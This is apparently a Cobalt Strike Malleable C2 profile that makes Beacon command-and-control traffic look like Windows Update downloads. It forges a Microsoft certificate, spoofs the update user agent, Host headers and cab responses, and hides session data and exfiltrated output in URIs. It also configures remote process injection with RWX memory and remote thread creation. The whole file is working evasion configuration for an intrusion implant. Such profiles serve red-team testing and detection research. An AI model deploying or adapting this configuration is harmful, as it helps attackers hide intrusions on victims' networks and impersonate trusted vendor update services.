#
# Microsoft Update
# 
# Author: @bluscreenofjeff
#

#set https cert info
#information assumed based on other Microsoft certs
https-certificate {
    set CN       "www.windowsupdate.com"; #Common Name
    set O        "Microsoft Corporation"; #Organization Name
    set C        "US"; #Country
    set L        "Redmond"; #Locality
    set OU       "Microsoft IT"; #Organizational Unit Name
    set ST       "WA"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "60000";
set jitter    "20";

#default useragent for HTTP comms
set useragent "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "235";

http-get {

    set uri "/c/msdownload/update/others/2016/12/29136388_";

    client {

        header "Accept" "*/*";
        header "Host" "download.windowsupdate.com";
        
        #session metadata
        metadata {
            base64url;
            append ".cab";
            uri-append;
        }
    }


    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #Beacon's tasks
        output {

            print;
        }
    }
}

http-post {
    
    set uri "/c/msdownload/update/others/2016/12/3215234_";
    set verb "GET";

    client {

        header "Accept" "*/*";

        #session ID
        id {
            prepend "download.windowsupdate.com/c/";
            header "Host";
        }


        #Beacon's responses
        output {
            base64url;
            append ".cab";
            uri-append;
        }
    }

    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #empty
        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
    }
}

process-inject {
        # set how memory is allocated in a remote process
        # VirtualAllocEx or NtMapViewOfSection. The
        # NtMapViewOfSection option is for same-architecture injection only. 
        # VirtualAllocEx is always used for cross-arch memory allocations.

        set allocator "VirtualAllocEx";
        # shape the memory characteristics and content
        set min_alloc "16384";
        set startrwx "true";
        set userwx "false";
        transform-x86 {
        prepend "\x90\x90";
        }
        transform-x64 {
        # transform x64 injected content
        }
        # determine how to execute the injected code
        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart";
	    CreateRemoteThread "ntdll.dll!RtlUserThreadStart";
	    SetThreadContext;
            RtlCreateUserThread;
        }
}
